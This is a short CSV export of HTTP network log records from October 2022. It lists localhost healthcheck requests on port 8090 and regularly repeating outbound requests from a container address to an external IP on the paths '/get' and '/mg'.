"@timestamp","network.direction","source.ip","source.port","destination.port","destination.ip","bytes_in","bytes_out","network.protocol","url.path","url.full"
"Oct 25, 2022 @ 01:29:50.307",ingress,"127.0.0.1",43280,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:29:29.831",egress,"172.17.0.3",56554,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:29:20.295",ingress,"127.0.0.1",56468,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:29:09.938",egress,"172.17.0.3",51400,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:28:50.284",ingress,"127.0.0.1",56712,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:28:20.271",ingress,"127.0.0.1",44126,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:28:09.265",egress,"172.17.0.3",42538,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:27:59.154",egress,"172.17.0.3",43696,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:27:50.262",ingress,"127.0.0.1",57034,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:27:20.244",ingress,"127.0.0.1",38454,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:27:08.601",egress,"172.17.0.3",37270,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:26:50.236",ingress,"127.0.0.1",60546,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:26:28.481",egress,"172.17.0.3",43378,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:26:20.218",ingress,"127.0.0.1",47406,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:26:07.939",egress,"172.17.0.3",34294,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:25:50.205",ingress,"127.0.0.1",35460,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:25:20.196",ingress,"127.0.0.1",50876,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:25:07.270",egress,"172.17.0.3",55546,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:24:57.804",egress,"172.17.0.3",57902,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:24:50.014",ingress,"127.0.0.1",36466,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:24:20.005",ingress,"127.0.0.1",34454,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:24:06.600",egress,"172.17.0.3",50218,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:23:49.983",ingress,"127.0.0.1",45826,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:23:27.127",egress,"172.17.0.3",33268,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:23:19.962",ingress,"127.0.0.1",39146,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:23:05.926",egress,"172.17.0.3",41016,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:22:49.948",ingress,"127.0.0.1",43954,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:22:19.934",ingress,"127.0.0.1",35542,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
"Oct 25, 2022 @ 01:22:05.261",egress,"172.17.0.3",45554,80,"212.22.77.79",388B,173B,http,"/mg","http://212.22.77.79/mg"
"Oct 25, 2022 @ 01:21:56.448",egress,"172.17.0.3",54882,80,"212.22.77.79",425B,728B,http,"/get","http://212.22.77.79/get"
"Oct 25, 2022 @ 01:21:49.912",ingress,"127.0.0.1",56836,8090,"127.0.0.1",174B,"14.5KB",http,"/synchrony-proxy/healthcheck","http://127.0.0.1:8090/synchrony-proxy/healthcheck"
